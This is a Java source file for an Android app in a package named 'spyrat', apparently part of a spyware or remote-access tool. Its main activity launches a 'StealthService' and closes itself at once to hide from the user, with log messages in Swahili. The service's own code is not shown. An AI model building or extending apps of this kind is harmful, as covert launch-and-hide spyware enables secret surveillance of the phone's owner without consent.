package com.spyrat.investigation;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    private static final String TAG = "SpyratMain";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "🎯 MainActivity imeanzishwa");
        
        // Start the stealth service
        Intent serviceIntent = new Intent(this, StealthService.class);
        startService(serviceIntent);
        
        // Hide the activity immediately
        finish();
        
        Log.d(TAG, "✅ Service imeanzishwa na activity imefungwa");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "♻️ MainActivity imefutwa");
    }
}
